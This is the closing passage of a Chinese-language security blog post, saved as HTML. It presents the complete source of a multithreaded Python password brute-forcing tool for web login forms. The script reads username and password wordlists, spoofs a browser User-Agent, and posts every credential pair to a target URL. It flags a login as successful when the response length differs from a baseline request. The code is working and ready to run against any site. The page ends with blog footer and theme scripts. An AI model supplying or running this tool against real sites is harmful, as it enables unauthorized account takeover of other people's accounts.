+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">payload</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> pass_list:</span><br><span class="line">        r = requests.post(url=website, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;, headers=headers)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/1f68479/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8A%E5%8D%881.42.17.png" alt="截屏2022-04-10 上午1.42.17"><br>测试成功，这样一来一个简单的密码爆破工具开发完成，完整源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser()</span><br><span class="line">parser.usage = <span class="string">&quot;web_brute.py -s url -u user_file -p pass_file -t num&quot;</span></span><br><span class="line">parser.add_option(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--site&quot;</span>, dest=<span class="string">&quot;website&quot;</span>, metavar=<span class="string">&quot;url&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;website to test&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--userfile&quot;</span>, dest=<span class="string">&quot;userfile&quot;</span>, metavar=<span class="string">&quot;FILE&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;username from file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--passfile&quot;</span>, dest=<span class="string">&quot;passfile&quot;</span>, metavar=<span class="string">&quot;FILE&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;password from file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>)</span><br><span class="line">parser.add_option(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span>, dest=<span class="string">&quot;threads&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;number of threads&quot;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>)</span><br><span class="line"></span><br><span class="line">(options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">website = options.website</span><br><span class="line">threads = options.threads</span><br><span class="line">user_dict = options.userfile</span><br><span class="line">pass_dic = options.passfile</span><br><span class="line"></span><br><span class="line">pass_list = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pass_dic) <span class="keyword">as</span> f:</span><br><span class="line">    temp_list = f.readlines()</span><br><span class="line">    temp_threads_list = []</span><br><span class="line">    num = <span class="built_in">len</span>(temp_list)</span><br><span class="line">    </span><br><span class="line">    result = num/threads</span><br><span class="line">    result_num = math.floor(result)</span><br><span class="line">   </span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> temp_list:</span><br><span class="line">        flag = flag + <span class="number">1</span></span><br><span class="line">        temp_threads_list.append(line.strip())</span><br><span class="line">        <span class="keyword">if</span> flag == result:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            pass_list.append(temp_threads_list)</span><br><span class="line">            temp_threads_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> temp_threads_list:</span><br><span class="line">        pass_list[threads-<span class="number">1</span>].append(line)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8888/python_test/brute/brute_submit.php&quot;</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;12345&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">payload</span>):</span></span><br><span class="line">    user = payload[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    pass_list = payload[<span class="string">&quot;pass_list&quot;</span>]</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> pass_list:</span><br><span class="line">        r = requests.post(url=website, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span>&#125;, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r.text) != test():</span><br><span class="line">            <span class="built_in">print</span>(user + <span class="string">&quot;:&quot;</span> + password + <span class="string">&quot; login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads_list = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(user_dict) <span class="keyword">as</span> f:</span><br><span class="line">    user_dict = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> user_dict:</span><br><span class="line">        <span class="keyword">for</span> pass_line <span class="keyword">in</span> pass_list:</span><br><span class="line">            payload = &#123;<span class="string">&quot;username&quot;</span>: user.strip(), <span class="string">&quot;pass_list&quot;</span>: pass_line&#125;</span><br><span class="line">            threads_list.append(threading.Thread(target=scan, args=(payload,)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads_list:</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure>
+<p>以后我们可修改其中的参数、变量来应对不同的应用环境</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/e2f19ce9/">HTB: Control<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/dd582856/">数据库攻防之Redis渗透基础<span class="note">Newer</span></a></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
